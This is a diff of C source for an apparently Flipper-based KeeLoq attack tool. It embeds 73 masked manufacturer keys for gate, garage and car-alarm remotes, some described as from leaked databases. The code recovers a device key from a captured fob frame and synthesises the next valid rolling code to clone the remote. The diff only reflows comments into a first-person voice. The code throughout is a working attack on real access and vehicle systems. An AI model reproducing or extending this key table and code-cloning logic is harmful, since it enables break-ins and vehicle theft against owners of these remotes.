@@ -5,100 +5,93 @@
 
 
 /* ── Manufacturer key table ──────────────────────────────────────────────── */
-/* These 73 masked manufacturer keys come from public disclosures and field
-   research. They cover gate/garage and automotive/alarm products, plus common
-   default patterns. Each entry is { "Name", 0xMASKED_KEY, learning_type }.
-   kl_unmask_key() reverses the masking; tools/mask_mfrkeys.py applies it to
-   the table. See the note above FLIPPER_MFR_KEYS. */
+/* These 73 masked manufacturer keys come from public disclosures and field research. They cover gate/garage and automotive/alarm products, plus common default patterns. Each entry is { "Name", 0xMASKED_KEY, learning_type }. kl_unmask_key() reverses the masking; tools/mask_mfrkeys.py applies it to the table. See the note above FLIPPER_MFR_KEYS. */
 const MfrKey FLIPPER_MFR_KEYS[N_MFR_KEYS] = {
     /* ── OEM automotive ─────────────────────────────────────────────────── */
-    /* This is the public OEM automotive KeeLoq key that brings the table to
-       N_MFR_KEYS entries. Previously the count was already 73, but this entry
-       was missing, leaving index 72 zero-initialized (NULL name, zero key).
-       Bounds checks allowed that slot into key derivation and the FOBLoq list. */
+    /* This is the public OEM automotive KeeLoq key that brings the table to N_MFR_KEYS entries. Previously the count was already 73, but this entry was missing, leaving index 72 zero-initialized (NULL name, zero key). Bounds checks allowed that slot into key derivation and the FOBLoq list. */
     { "Kia_V3_V4_OEM",  0xCC88E6C23CEC0269ULL, 1 },   /* Simple Learning, Kia/Hyundai V3/V4 */
     /* ── Gate / Garage / Barrier (EU) ──────────────────────────────────── */
-    { "DoorHan",        0xC9F1C7E5F53307FDULL, 1 },   /* Simple Learning    */
-    { "Beninca_ARC",    0xA2BE75CFB0AD3AA1ULL, 9 },   /* Magic Serial 1     */
-    { "Kingates_Stylo", 0xFFDC715050717F5EULL, 10 },  /* Magic Serial 2     */
-    { "Jarolift",       0x50241558F671D394ULL, 11 },  /* Magic Serial 3     */
-    { "FAAC_SLH",       0x5AF9BA5B46F5FD1AULL, 5 },   /* FAAC SLH           */
-    { "BFT",            0xDED83DDBFE99BEFAULL, 3 },   /* Secure Learning    */
-    { "Stilmatic",      0x1FDB86420ECA9753ULL, 2 },   /* Normal Learning    */
-    { "Mongoose",       0xCB81238F43602DC3ULL, 2 },   /* Normal Learning    */
-    { "NICE_Smilo",     0x3EDD1FDF1E5EBDFDULL, 1 },   /* Simple Learning    */
-    { "NICE_MHOUSE",    0xDAFAD91DFD3D1E7EULL, 1 },   /* Simple Learning    */
-    { "Dea_Mio",        0xAC22022474571662ULL, 1 },   /* Simple Learning    */
-    { "Genius_Bravo",   0xF7DB77772822E822ULL, 2 },   /* Normal Learning    */
-    { "FAAC_RC_XT",     0xF7DB77774822E822ULL, 2 },   /* Normal Learning    */
-    { "Came_Space",     0x06F1AE44F2E405BBULL, 1 },   /* Simple Learning    */
-    { "DTM_Neo",        0xCB32EDD1971368FEULL, 1 },   /* Simple Learning    */
-    { "GSN",            0xE7D1219BDD258259ULL, 2 },   /* Normal Learning    */
-    { "Beninca",        0xA2BE61CFB0AD2EA1ULL, 4 },   /* Magic XOR          */
-    { "Elmes_Poland",   0x48D03F806B3CE4FBULL, 2 },   /* Normal Learning    */
-    { "IronLogic",      0x3717F573717F7757ULL, 1 },   /* Simple Learning    */
-    { "IronLogic_SM",   0x737577F717375F71ULL, 1 },   /* Simple (IL-100)    */
-    { "Comunello",      0x0BDD2E7BF8BDC943ULL, 2 },   /* Normal Learning    */
-    { "Sommer",         0x0AADF19AACE0980EULL, 2 },   /* Normal Learning    */
-    { "Normstahl",      0x675D0E91520384C3ULL, 2 },   /* Normal Learning    */
-    { "KEY",            0x581178D85FF95171ULL, 1 },   /* Simple Learning    */
-    { "JCM_Tech",       0xFABC5D1857018655ULL, 1 },   /* Simple Learning    */
-    { "Novoferm",       0xF07BD17EB05B515EULL, 1 },   /* Simple Learning    */
-    { "EcoStar",        0x9F387B505EB167B7ULL, 2 },   /* Normal Learning    */
-    { "Gibidi",         0xA4545724545733B3ULL, 1 },   /* Simple Learning    */
-    { "Aprimatic",      0x391BDBD91F9A5F99ULL, 1 },   /* Simple Learning    */
-    { "Jolly_Motors",   0xA4ACC22858AEE00AULL, 1 },   /* Simple Learning    */
+    { "DoorHan",        0xC9F1C7E5F53307FDULL, 1 },   /* Simple Learning */
+    { "Beninca_ARC",    0xA2BE75CFB0AD3AA1ULL, 9 },   /* Magic Serial 1 */
+    { "Kingates_Stylo", 0xFFDC715050717F5EULL, 10 },  /* Magic Serial 2 */
+    { "Jarolift",       0x50241558F671D394ULL, 11 },  /* Magic Serial 3 */
+    { "FAAC_SLH",       0x5AF9BA5B46F5FD1AULL, 5 },   /* FAAC SLH */
+    { "BFT",            0xDED83DDBFE99BEFAULL, 3 },   /* Secure Learning */
+    { "Stilmatic",      0x1FDB86420ECA9753ULL, 2 },   /* Normal Learning */
+    { "Mongoose",       0xCB81238F43602DC3ULL, 2 },   /* Normal Learning */
+    { "NICE_Smilo",     0x3EDD1FDF1E5EBDFDULL, 1 },   /* Simple Learning */
+    { "NICE_MHOUSE",    0xDAFAD91DFD3D1E7EULL, 1 },   /* Simple Learning */
+    { "Dea_Mio",        0xAC22022474571662ULL, 1 },   /* Simple Learning */
+    { "Genius_Bravo",   0xF7DB77772822E822ULL, 2 },   /* Normal Learning */
+    { "FAAC_RC_XT",     0xF7DB77774822E822ULL, 2 },   /* Normal Learning */
+    { "Came_Space",     0x06F1AE44F2E405BBULL, 1 },   /* Simple Learning */
+    { "DTM_Neo",        0xCB32EDD1971368FEULL, 1 },   /* Simple Learning */
+    { "GSN",            0xE7D1219BDD258259ULL, 2 },   /* Normal Learning */
+    { "Beninca",        0xA2BE61CFB0AD2EA1ULL, 4 },   /* Magic XOR */
+    { "Elmes_Poland",   0x48D03F806B3CE4FBULL, 2 },   /* Normal Learning */
+    { "IronLogic",      0x3717F573717F7757ULL, 1 },   /* Simple Learning */
+    { "IronLogic_SM",   0x737577F717375F71ULL, 1 },   /* Simple (IL-100) */
+    { "Comunello",      0x0BDD2E7BF8BDC943ULL, 2 },   /* Normal Learning */
+    { "Sommer",         0x0AADF19AACE0980EULL, 2 },   /* Normal Learning */
+    { "Normstahl",      0x675D0E91520384C3ULL, 2 },   /* Normal Learning */
+    { "KEY",            0x581178D85FF95171ULL, 1 },   /* Simple Learning */
+    { "JCM_Tech",       0xFABC5D1857018655ULL, 1 },   /* Simple Learning */
+    { "Novoferm",       0xF07BD17EB05B515EULL, 1 },   /* Simple Learning */
+    { "EcoStar",        0x9F387B505EB167B7ULL, 2 },   /* Normal Learning */
+    { "Gibidi",         0xA4545724545733B3ULL, 1 },   /* Simple Learning */
+    { "Aprimatic",      0x391BDBD91F9A5F99ULL, 1 },   /* Simple Learning */
+    { "Jolly_Motors",   0xA4ACC22858AEE00AULL, 1 },   /* Simple Learning */
     /* ── Automotive / Alarm (RU/CIS) ───────────────────────────────────── */
-    { "Centurion",      0x17DFE2414C95F466ULL, 2 },   /* Normal Learning    */
-    { "Monarch",        0x257167151FC71F25ULL, 2 },   /* Normal Learning    */
-    { "Rosh",           0xAC220224745717C2ULL, 1 },   /* Simple Learning    */
-    { "Pecinin",        0x0202E3C9EC8B71D2ULL, 1 },   /* Simple Learning    */
-    { "Rossi",          0x35282C31E96C282CULL, 1 },   /* Simple Learning    */
-    { "Merlin",         0xB421E99AC34410BFULL, 2 },   /* Normal Learning    */
-    { "Motorline",      0x9A7325F9AE289D93ULL, 2 },   /* Normal Learning    */
-    { "Steelmate",      0xDB3C26EED950410BULL, 2 },   /* Normal Learning    */
-    { "Cardin_S449",    0xC00BC4D07A9FF378ULL, 2 },   /* Normal Learning    */
-    { "Alligator",      0x0DE13B3AFDD86AA9ULL, 1 },   /* Simple Learning    */
-    { "Tomahawk_9010",  0xF7FD967175371DD7ULL, 1 },   /* Simple Learning    */
-    { "Pantera",        0x5F9EBBF85ABBDEDFULL, 1 },   /* Simple Learning    */
-    { "SL_A2-A4",       0x88640868B86C2409ULL, 1 },   /* Simple Learning    */
-    { "Cenmax_St-5",    0x0802698E8AC8E228ULL, 1 },   /* Simple Learning    */
-    { "SL_B6_B9",       0xCDE112202CE8A9ABULL, 1 },   /* Simple Learning    */
-    { "Harpoon",        0x97579BF7967BF3C7ULL, 1 },   /* Simple Learning    */
-    { "Tomahawk_TZ9",   0x779BF7974793DBF6ULL, 1 },   /* Simple Learning    */
-    { "Tomahawk_ZX",    0xBED012220ECA9A9CULL, 1 },   /* Simple Learning    */
-    { "Cenmax_St-7",    0xFFA04762F9D21BA1ULL, 1 },   /* Simple Learning    */
-    { "Sheriff",        0x13C5E25465F87531ULL, 1 },   /* Simple Learning    */
-    { "Pantera_CLK",    0x67D6273B5635FF51ULL, 1 },   /* Simple Learning    */
-    { "Cenmax",         0xFDB8657531FDB531ULL, 1 },   /* Simple Learning    */
-    { "Alligator_S275", 0xBCE19B9B27E85DF1ULL, 1 },   /* Simple Learning    */
-    { "Guard_RF311",    0x4C2F2A14467F945BULL, 2 },   /* Normal Learning    */
-    { "Partisan_RX",    0xF52359726954A2D0ULL, 1 },   /* Simple Learning    */
+    { "Centurion",      0x17DFE2414C95F466ULL, 2 },   /* Normal Learning */
+    { "Monarch",        0x257167151FC71F25ULL, 2 },   /* Normal Learning */
+    { "Rosh",           0xAC220224745717C2ULL, 1 },   /* Simple Learning */
+    { "Pecinin",        0x0202E3C9EC8B71D2ULL, 1 },   /* Simple Learning */
+    { "Rossi",          0x35282C31E96C282CULL, 1 },   /* Simple Learning */
+    { "Merlin",         0xB421E99AC34410BFULL, 2 },   /* Normal Learning */
+    { "Motorline",      0x9A7325F9AE289D93ULL, 2 },   /* Normal Learning */
+    { "Steelmate",      0xDB3C26EED950410BULL, 2 },   /* Normal Learning */
+    { "Cardin_S449",    0xC00BC4D07A9FF378ULL, 2 },   /* Normal Learning */
+    { "Alligator",      0x0DE13B3AFDD86AA9ULL, 1 },   /* Simple Learning */
+    { "Tomahawk_9010",  0xF7FD967175371DD7ULL, 1 },   /* Simple Learning */
+    { "Pantera",        0x5F9EBBF85ABBDEDFULL, 1 },   /* Simple Learning */
+    { "SL_A2-A4",       0x88640868B86C2409ULL, 1 },   /* Simple Learning */
+    { "Cenmax_St-5",    0x0802698E8AC8E228ULL, 1 },   /* Simple Learning */
+    { "SL_B6_B9",       0xCDE112202CE8A9ABULL, 1 },   /* Simple Learning */
+    { "Harpoon",        0x97579BF7967BF3C7ULL, 1 },   /* Simple Learning */
+    { "Tomahawk_TZ9",   0x779BF7974793DBF6ULL, 1 },   /* Simple Learning */
+    { "Tomahawk_ZX",    0xBED012220ECA9A9CULL, 1 },   /* Simple Learning */
+    { "Cenmax_St-7",    0xFFA04762F9D21BA1ULL, 1 },   /* Simple Learning */
+    { "Sheriff",        0x13C5E25465F87531ULL, 1 },   /* Simple Learning */
+    { "Pantera_CLK",    0x67D6273B5635FF51ULL, 1 },   /* Simple Learning */
+    { "Cenmax",         0xFDB8657531FDB531ULL, 1 },   /* Simple Learning */
+    { "Alligator_S275", 0xBCE19B9B27E85DF1ULL, 1 },   /* Simple Learning */
+    { "Guard_RF311",    0x4C2F2A14467F945BULL, 2 },   /* Normal Learning */
+    { "Partisan_RX",    0xF52359726954A2D0ULL, 1 },   /* Simple Learning */
     /* ── Additional keys (field research / leaked databases) ───────────── */
-    { "APS_1100_2550",  0x12FD7DB11F927A79ULL, 1 },   /* Simple Learning    */
-    { "Pantera_XS_Jag", 0x12FD7DB11FB39B99ULL, 1 },   /* Simple Learning    */
-    { "KGB_Subaru",     0x777773117F9C7777ULL, 6 },   /* Magic Serial 1     */
-    { "Magic_1",        0x777773117F9C7777ULL, 7 },   /* Magic Serial 2     */
-    { "Magic_2",        0x777771137D9E7777ULL, 7 },   /* Magic Serial 2     */
-    { "Magic_3",        0xC0139C57777762F1ULL, 8 },   /* Magic Serial 3     */
-    { "Magic_4",        0xFBDC23D777776477ULL, 8 },   /* Magic Serial 3     */
-    { "Teco",           0xD3AA6953AD4D81D5ULL, 0 },   /* Iterate (direct+rev)*/
-    { "Mutanco",        0x6383134641C34230ULL, 0 },   /* Iterate (direct+rev)*/
-    { "Leopard",        0x8CF10B8C663FB57BULL, 0 },   /* Iterate (direct+rev)*/
-    { "Faraon",         0x3BF061B32789C631ULL, 0 },   /* Iterate (direct+rev)*/
-    { "Reff",           0x283DD8CF3F463A55ULL, 0 },   /* Iterate (direct+rev)*/
-    { "ZX_730_750",     0x38221391D5C5A1D4ULL, 0 },   /* Iterate (direct+rev)*/
-    { "FFFF_Simple",    0x8888888888888888ULL, 1 },   /* Simple Learning    */
-    { "FFFF_Normal",    0x8888888888888888ULL, 2 },   /* Normal Learning    */
-    { "Zero_Simple",    0x7777777777777777ULL, 1 },   /* Simple Learning    */
-    { "Zero_Normal",    0x7777777777777777ULL, 2 },   /* Normal Learning    */
+    { "APS_1100_2550",  0x12FD7DB11F927A79ULL, 1 },   /* Simple Learning */
+    { "Pantera_XS_Jag", 0x12FD7DB11FB39B99ULL, 1 },   /* Simple Learning */
+    { "KGB_Subaru",     0x777773117F9C7777ULL, 6 },   /* Magic Serial 1 */
+    { "Magic_1",        0x777773117F9C7777ULL, 7 },   /* Magic Serial 2 */
+    { "Magic_2",        0x777771137D9E7777ULL, 7 },   /* Magic Serial 2 */
+    { "Magic_3",        0xC0139C57777762F1ULL, 8 },   /* Magic Serial 3 */
+    { "Magic_4",        0xFBDC23D777776477ULL, 8 },   /* Magic Serial 3 */
+    { "Teco",           0xD3AA6953AD4D81D5ULL, 0 },   /* Iterate (direct+rev) */
+    { "Mutanco",        0x6383134641C34230ULL, 0 },   /* Iterate (direct+rev) */
+    { "Leopard",        0x8CF10B8C663FB57BULL, 0 },   /* Iterate (direct+rev) */
+    { "Faraon",         0x3BF061B32789C631ULL, 0 },   /* Iterate (direct+rev) */
+    { "Reff",           0x283DD8CF3F463A55ULL, 0 },   /* Iterate (direct+rev) */
+    { "ZX_730_750",     0x38221391D5C5A1D4ULL, 0 },   /* Iterate (direct+rev) */
+    { "FFFF_Simple",    0x8888888888888888ULL, 1 },   /* Simple Learning */
+    { "FFFF_Normal",    0x8888888888888888ULL, 2 },   /* Normal Learning */
+    { "Zero_Simple",    0x7777777777777777ULL, 1 },   /* Simple Learning */
+    { "Zero_Normal",    0x7777777777777777ULL, 2 },   /* Normal Learning */
 };
 
 /* ── Bit helpers ─────────────────────────────────────────────────────────── */
 static inline uint32_t kl_bit(uint32_t x, int k) { return (x >> k) & 1u; }
 
 /* ── Non-linear function (standard KeeLoq NLF, AN1064) ───────────────────── */
-/* 5-input LUT value 0x3A5C742E.                                              */
+/* 5-input LUT value 0x3A5C742E. */
 uint32_t kl_nlf(uint32_t w) {
     return (0x3A5C742EUL >> (w & 31u)) & 1u;
 }
@@ -150,18 +143,14 @@ bool kl_self_test(void) {
 }
 
 /* ── PWM bit extractor ────────────────────────────────────────────────────── */
-/*
- * Find a preamble of at least four pairs with HIGH+LOW <= 2.5T, then decode
- * data bits as '1' = 2T HIGH + T LOW and '0' = T HIGH + 2T LOW. If there is
- * no such preamble, try the leader form: HIGH 4T..16T followed by LOW <=2T.
- */
+/* I find a preamble of at least four pairs with HIGH+LOW <= 2.5T, then I decode data bits as '1' = 2T HIGH + T LOW and '0' = T HIGH + 2T LOW. If there is no such preamble, I try the leader form: HIGH 4T..16T followed by LOW <=2T. */
 uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
     uint16_t  b       = 0;
-    uint32_t  thr_hi  = te + (te >> 1);          /* 1.5×TE   */
-    uint32_t  thr_tot = (te << 1) + (te >> 1);   /* 2.5×TE   */
+    uint32_t  thr_hi  = te + (te >> 1);          /* 1.5×TE */
+    uint32_t  thr_tot = (te << 1) + (te >> 1);   /* 2.5×TE */
     int       data_start = -1;
 
-/* Check both pulse alignments: the buffer may start HIGH-first or LOW-first. */
+/* I check both pulse alignments: the buffer may start HIGH-first or LOW-first. */
     for(int phase = 0; phase <= 1 && data_start < 0; phase++) {
         for(int i = phase; i + 1 < n; i += 2) {
             int pc = 0, j = i;
@@ -170,7 +159,7 @@ uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
         }
     }
 
-    /* Try the leader format used by HCS200/201 and some clones. */
+    /* I try the leader format used by HCS200/201 and some clones. */
     if(data_start < 0) {
         uint32_t ldr_lo = te << 1;
         for(int i = 0; i + 1 < n && data_start < 0; i++) {
@@ -187,33 +176,22 @@ uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
 }
 
 /* ── KeeLoq frame parser ──────────────────────────────────────────────────── */
-/*
- * Standard HCS3xx frame layout. Bits arrive LSB-first over the air and remain
- * in that order in bits[]:
- *   bits[0..31]  = 32-bit encrypted hop counter
- *   bits[32..59] = 28-bit serial number
- *   bits[60..63] = 4-bit button / discriminant
- *   bit[64]      = overflow flag
- *   bit[65]      = repeat flag
- *
- * Require at least 66 bits and reject zero hop or button fields; an unpressed
- * fob has button zero and is not a useful capture.
- */
+/* Standard HCS3xx frame layout. Bits arrive LSB-first over the air and remain in that order in bits[]: bits[0..31] = 32-bit encrypted hop counter, bits[32..59] = 28-bit serial number, bits[60..63] = 4-bit button / discriminant, bit[64] = overflow flag, bit[65] = repeat flag. I require at least 66 bits and reject zero hop or button fields; an unpressed fob has button zero and is not a useful capture. */
 bool kl_parse(const char* bits, int n, KLFrame* f) {
     if(!bits || n < 66 || !f) return false;
     memset(f, 0, sizeof(*f));
 
-    /* Extract enc (bits 0-31, LSB first) */
+    /* I extract enc (bits 0-31, LSB first) */
     uint32_t enc = 0;
     for(int i = 0; i < 32; i++)
         if(bits[i] == '1') enc |= (1u << i);
 
-    /* Extract SN (bits 32-59) */
+    /* I extract SN (bits 32-59) */
     uint32_t sn = 0;
     for(int i = 0; i < 28; i++)
         if(bits[32 + i] == '1') sn |= (1u << i);
 
-    /* Extract button nibble (bits 60-63) */
+    /* I extract button nibble (bits 60-63) */
     uint8_t btn = 0;
     for(int i = 0; i < 4; i++)
         if(bits[60 + i] == '1') btn |= (1u << i);
@@ -234,26 +212,7 @@ bool kl_parse(const char* bits, int n, KLFrame* f) {
 }
 
 /* ── Key derivation ───────────────────────────────────────────────────────── */
-/*
- * The firmware-compatible derivation table has 14 modes per seed:
- *   0: simple             — seed as-is
- *   1: normal             — Encrypt(SN<<4 | btn, seed)  ... for recovery use seed
- *   2: xor-seed           — seed ^ 0xAAAA555500FF00FF
- *   3: secure (AN1031)    — seed ^ (sn_16 | sn_16<<32)
- *   4: full-SN            — seed ^ (sn_28 repeated)
- *   5: normal-inv         — ~normal
- *   6: byteswap-SN        — byteswap of the seed
- *   7: half-mirror        — lo32 repeated in hi32
- *   8: normal-dec         — Standard AN1064 decrypt form
- *   9: xor-type1 (Beninca)— seed ^ 0x5555555555555555
- *  10: magic-serial-1     — seed ^ (sn | (uint64_t)sn << 32)
- *  11: magic-serial-2     — ROR-32 of seed
- *  12: byte-rev-simple    — byte-reversed seed
- *  13: byte-rev-normal    — byte-reversed normal form
- *
- * Key recovery derives the device key from the captured frame and serial
- * number in kl_recover_key().
- */
+/* The firmware-compatible derivation table has 14 modes per seed: 0: simple — seed as-is, 1: normal — Encrypt(SN<<4 | btn, seed) ... for recovery I use seed, 2: xor-seed — seed ^ 0xAAAA555500FF00FF, 3: secure (AN1031) — seed ^ (sn_16 | sn_16<<32), 4: full-SN — seed ^ (sn_28 repeated), 5: normal-inv — ~normal, 6: byteswap-SN — byteswap of the seed, 7: half-mirror — lo32 repeated in hi32, 8: normal-dec — Standard AN1064 decrypt form, 9: xor-type1 (Beninca)— seed ^ 0x5555555555555555, 10: magic-serial-1 — seed ^ (sn | (uint64_t)sn << 32), 11: magic-serial-2 — ROR-32 of seed, 12: byte-rev-simple — byte-reversed seed, 13: byte-rev-normal — byte-reversed normal form. I derive the device key from the captured frame and serial number in kl_recover_key(). */
 static uint64_t byteswap64(uint64_t v) {
     return ((v & 0xFF00000000000000ULL) >> 56) |
            ((v & 0x00FF000000000000ULL) >> 40) |
@@ -265,8 +224,7 @@ static uint64_t byteswap64(uint64_t v) {
            ((v & 0x00000000000000FFULL) << 56);
 }
 
-/* Build one derived-key candidate on demand instead of keeping all 560 entries
-   in memory. Keep this mode order aligned with kl_derive_all_keys(). */
+/* I build one derived-key candidate on demand instead of keeping all 560 entries in memory. I keep this mode order aligned with kl_derive_all_keys(). */
 static bool kl_derive_key_at(int k, int mode, DerivedKey* out) {
     if(!out || k < 0 || k >= N_MFR_KEYS || mode < 0 || mode >= 14) return false;
     uint64_t s = kl_unmask_key(FLIPPER_MFR_KEYS[k].key);
@@ -335,12 +293,7 @@ int kl_derive_all_keys(DerivedKey* out) {
 }
 
 /* ── Key recovery (key sweep against enc + SN) ────────────────────────────── */
-/* The Auto fast path tries each built-in seed directly, with AN1064
-   normal-learning SN diversification, secure-learning XOR, and XOR-Type-1.
-   It deliberately skips the full 14-mode sweep (about 2,000 candidates);
-   additional keys can be supplied through flipper_keyvault. A candidate must
-   decrypt to the captured button and the low 10 serial bits in the
-   discriminant field. */
+/* The Auto fast path tries each built-in seed directly, with AN1064 normal-learning SN diversification, secure-learning XOR, and XOR-Type-1. I deliberately skip the full 14-mode sweep (about 2,000 candidates); I can supply additional keys through flipper_keyvault. A candidate must decrypt to the captured button and the low 10 serial bits in the discriminant field. */
 static const DerivedKey* s_vault_keys;
 static int               s_vault_n;
 
@@ -360,9 +313,7 @@ static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) 
         dk = lo | (hi << 32);
     }
     uint32_t dec = kl_decrypt(enc, dk);
-    /* HCS200/300/301 plaintext is [button 4 | discriminant 10 | counter 16].
-       Require the 10-bit discriminant to equal SN[9:0], as well as an exact
-       button match. Looser alternatives allowed random PWM false matches. */
+    /* HCS200/300/301 plaintext is [button 4 | discriminant 10 | counter 16]. I require the 10-bit discriminant to equal SN[9:0], as well as an exact button match. Looser alternatives allowed random PWM false matches. */
     if(((dec >> 28) & 0xF) != btn) return false;
     if(((dec >> 16) & 0x3FFu) != (f->sn & 0x3FFu)) return false;
     f->dec  = dec;
@@ -372,9 +323,7 @@ static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) 
     f->key     = dk;
     snprintf(f->device_key_hex, sizeof(f->device_key_hex),
              "%016llX", (unsigned long long)dk);
-    /* A recovered device key lets us synthesize a valid next hop, so the
-       advertised window is a true counter estimate. Keep it on the shared
-       KL_PREDICT_WINDOW constant. */
+    /* A recovered device key lets me synthesize a valid next hop, so the advertised window is a true counter estimate. I keep it on the shared KL_PREDICT_WINDOW constant. */
     f->predict_window = KL_PREDICT_WINDOW;
     f->predict_lo = (f->cnt + 1) & 0xFFFF;
     f->predict_hi = (f->cnt + 16) & 0xFFFF;
@@ -384,8 +333,7 @@ static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) 
 bool kl_recover_key(KLFrame* f) {
     if(!f || f->enc == 0) return false;
 
-    /* Keep Auto's search short: test each manufacturer seed directly, with
-       normal-learning diversification, secure learning, and XOR-Type-1. */
+    /* I keep Auto's search short: I test each manufacturer seed directly, with normal-learning diversification, secure learning, and XOR-Type-1. */
     for(int k = 0; k < N_MFR_KEYS; k++) {
         const char* nm = FLIPPER_MFR_KEYS[k].name;
         uint64_t mk = kl_unmask_key(FLIPPER_MFR_KEYS[k].key);
@@ -395,18 +343,18 @@ bool kl_recover_key(KLFrame* f) {
         snprintf(label, sizeof(label), "%s/seed", nm);
         if(kl_try_one(f, label, mk, false)) return true;
         if(kl_try_one(f, label, mk, true))  return true;
-        /* Try Secure Learning (AN1031) with the low 16 serial bits repeated. */
+        /* I try Secure Learning (AN1031) with the low 16 serial bits repeated. */
         uint16_t sn16 = (uint16_t)(f->sn & 0xFFFF);
         uint64_t secure = mk ^ ((uint64_t)sn16 | ((uint64_t)sn16 << 32));
         snprintf(label, sizeof(label), "%s/secure", nm);
         if(kl_try_one(f, label, secure, false)) return true;
-        /* Try the XOR-Type-1 variant used by Beninca-class remotes. */
+        /* I try the XOR-Type-1 variant used by Beninca-class remotes. */
         uint64_t mag = mk ^ 0x5555555555555555ULL;
         snprintf(label, sizeof(label), "%s/xor1", nm);
         if(kl_try_one(f, label, mag, false)) return true;
         if(kl_try_one(f, label, mag, true))  return true;
     }
-    /* Apply the direct-key and SN-diversified checks to user-supplied keys too. */
+    /* I apply the direct-key and SN-diversified checks to user-supplied keys too. */
     for(int i = 0; i < s_vault_n; i++) {
         if(kl_try_one(f, s_vault_keys[i].name, s_vault_keys[i].key, false)) return true;
         if(kl_try_one(f, s_vault_keys[i].name, s_vault_keys[i].key, true))  return true;
@@ -415,27 +363,13 @@ bool kl_recover_key(KLFrame* f) {
 }
 
 /* ── Next-code synthesis (matched key → fresh frame on the wire) ──────────── */
-/*
- * A capture provides the encrypted hop, not the plaintext counter. With a
- * recovered or supplied key, this routine encrypts the next counter and emits
- * a standard HCS3xx frame, LSB-first, preserving the captured button:
- *   bits 0..31   enc' = Encrypt((btn << 28) | ctr, key)
- *   bits 32..59  sn
- *   bits 60..63  btn (== high nibble of the plaintext → self-consistent)
- *   bits 64..65  ovf / rep
- * Its eight short preamble pairs match the format accepted by kl_pwm().
- */
+/* A capture provides the encrypted hop, not the plaintext counter. With a recovered or supplied key, this routine encrypts the next counter and emits a standard HCS3xx frame, LSB-first, preserving the captured button: bits 0..31 enc' = Encrypt((btn << 28) | ctr, key), bits 32..59 sn, bits 60..63 btn (== high nibble of the plaintext → self-consistent), bits 64..65 ovf / rep. Its eight short preamble pairs match the format accepted by kl_pwm(). */
 bool flipper_kl_next_pulses(const KLFrame* f, uint32_t ctr, uint64_t key,
                             uint32_t te, float freq_mhz, FlipperPulseBuf* out) {
     if(!f || !out || te < 100 || te > 4000) return false;
     memset(out, 0, sizeof(*out));
 
-    /* Build the plaintext the way a real HCS encoder does:
-         [31:28] = button  [27:26] = reserved(0)  [25:16] = 10-bit
-         discriminator (= SN[9:0])  [15:0] = counter.
-       The receiver decrypts to this layout and checks the discriminator against
-       the serial's low 10 bits; omitting it would make every synthesized hop
-       fail that check except for serials whose low 10 bits are already zero. */
+    /* I build the plaintext the way a real HCS encoder does: [31:28] = button [27:26] = reserved(0) [25:16] = 10-bit discriminator (= SN[9:0]) [15:0] = counter. The receiver decrypts to this layout and checks the discriminator against the serial's low 10 bits; omitting it would make every synthesized hop fail that check except for serials whose low 10 bits are already zero. */
     uint32_t plain = ((uint32_t)(f->btn & 0xF) << 28) |
                      ((f->sn & 0x3FFu) << 16) |
                      (ctr & 0xFFFFu);
@@ -499,12 +433,12 @@ bool flipper_kl_clone_next(const KLFrame* captured, uint64_t manufacturer_key,
     if(manufacturer_key == 0 || manufacturer_key == UINT64_MAX) return false;
     if(te < 100 || te > 4000) return false;
 
-    /* Derive the device key from the serial and manufacturer key. */
+    /* I derive the device key from the serial and manufacturer key. */
     uint64_t dev;
     if(!kl_derive_device_key(manufacturer_key, captured->sn, &dev))
         return false;
 
-    /* Recover the plaintext counter from the captured hop. */
+    /* I recover the plaintext counter from the captured hop. */
     uint32_t plain = kl_decrypt(captured->enc, dev);
     uint8_t  btn   = (uint8_t)((plain >> 28) & 0xFu);
     uint32_t disc  = (plain >> 16) & 0x3FFu;
